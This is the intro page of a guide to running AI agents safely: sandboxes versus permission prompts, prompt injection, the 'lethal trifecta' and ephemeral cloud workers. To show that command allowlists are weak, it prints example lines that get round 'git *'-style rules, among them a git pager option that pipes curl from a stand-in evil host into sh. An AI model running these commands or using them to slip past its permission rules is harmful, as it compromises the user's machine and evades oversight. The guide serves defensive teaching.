The agent stack, from the kernel up

What it actually takes to run AI agents safely: where they run, what they can touch and reach, whose credentials they use, what they may do next, and how you find out what happened. One page per layer, each with the mechanism, the reasoning, and step-by-step examples.

In one minute

To the operating system, an AI agent is a process that runs commands chosen at runtime by text it received over the network. That text comes from you, but also from every file, web page and tool result the agent reads, and the model can't reliably tell instructions from data. Everything in this guide is about bounding what such a process can do: where it runs, what it can see, where it can connect, which credentials it can use, which actions it may take, and how you find out afterwards what it did.

What an agent is, from the OS's point of view

The model never executes anything. It returns text, something like {"tool": "bash", "command": "rm -rf build/"}, and an ordinary program, the harness, carries it out. Whatever the harness process is allowed to do, the agent can do. If the harness runs as you on your laptop, the agent is you: it has your SSH keys, your cloud credentials in ~/.config, your browser's files, your company VPN.

And the text that steers it doesn't only come from you. A README can contain instructions. So can an issue description, an API response, a code comment, a web page with white-on-white text. Feeding any of that to a model is like reading a letter out loud to an assistant who does whatever the letter says. This is prompt injection, and it's covered properly in Policy & prompt injection. It's the reason every other layer exists.

A permission prompt

The harness asks you before running something. It's only as good as your attention, and it falls apart the moment you click "always allow". It runs inside the very process it's supposed to restrict.

A sandbox

The kernel (or a hypervisor) enforces the limits. It doesn't matter what the agent decided or what you approved: the forbidden operation fails. It's enforced from outside the process.

Why "allow git *" is not a security boundary

Many agents let you allowlist commands by pattern. That's a convenience feature, because many "safe" commands can run arbitrary code:

git -c core.pager='sh -c "curl evil.sh | sh"' log    # matches "git *"
npm install some-package                              # runs the package's install script
find . -name x -exec sh -c '...' \;                   # matches "find *"
python -c "import os; os.system('...')"               # matches "python *"
make test                                             # runs whatever the Makefile says, and the agent can edit it

Pattern rules decide what the agent asks to do. Only the layers underneath decide what actually happens.

What can actually go wrong

Concrete scenarios are more useful than "security" in general. Every page in this guide points back to rows in this table.

The lethal trifecta

A framing from Simon Willison that runs through this whole guide: an agent becomes dangerous when one run has all three of (1) access to private data, (2) exposure to untrusted content, and (3) a way to send data out. Remove any one and a data-theft attack can't complete. Much of this stack is about keeping those three from lining up, and noticing when they do.

"Just spawn agents in the cloud": does that remove the need?

Partly. The trend is real: more and more agents run as ephemeral cloud workers. A task comes in, a fresh environment boots, the agent works, a PR or a report comes out, and the environment is thrown away. That solves one big problem: your laptop is no longer the blast radius. If the agent wipes the disk, it wipes a disk that was going to be deleted anyway.

Look at what "spawn it in the cloud" means underneath, though:

  • The fresh environment is a sandbox. It's a microVM, a gVisor container or an ordinary container, and someone had to build it. The cloud didn't remove sandboxing; it turned it into someone's product. Building that product is a job startups hire for.
  • The blast radius moves from the machine to what the machine can reach: the GitHub token it was given, the database it can query, the internal network it sits on, the cloud account its identity belongs to. A disposable VM holding a token with org-wide write access is not safe.
  • Scale becomes the problem: booting in under a second, restoring a prepared environment instead of reinstalling everything, running hundreds at once, killing the stuck ones, paying only for what runs.
A real example: the environment that wrote this guide

This guide was written by an assistant running in exactly such a cloud workspace: an ephemeral Linux container, a fixed disk allowance, and outbound HTTPS forced through a proxy with an allowlist and its own certificate authority. Requests to sites that aren't on the list are refused before they leave. Almost every layer in this guide showed up in that one session.

So the reframing is: local sandboxing protects the host; cloud execution protects the host by making it disposable. Either way, the hard questions move up the stack, to network, identity, policy and observability. That's why this guide covers the full stack rather than only the sandbox.

How to read this guide

  1. Start with Processes & syscalls. It's the vocabulary for everything else: what a process is, what the kernel controls, and how a program starts a restricted one.
  2. Then read the components in order, MCP through the harness. Each page stands on its own, but they build on each other.
  3. Finish with the build plan: the order to build in, what "done" means, and the decisions that are yours to make.

Every page has the same shape: an in one minute summary, the mechanisms with step-by-step examples, the gotchas that bite people, what you'll build, and a few check yourself questions with answers you can open.

Two conventions
  • Linux experiments need a Linux machine. On a Mac, use a Linux VM such as an OrbStack machine.
  • Code snippets are short and meant to show a mechanism, not to be copied into a project. Writing the real thing is the point.
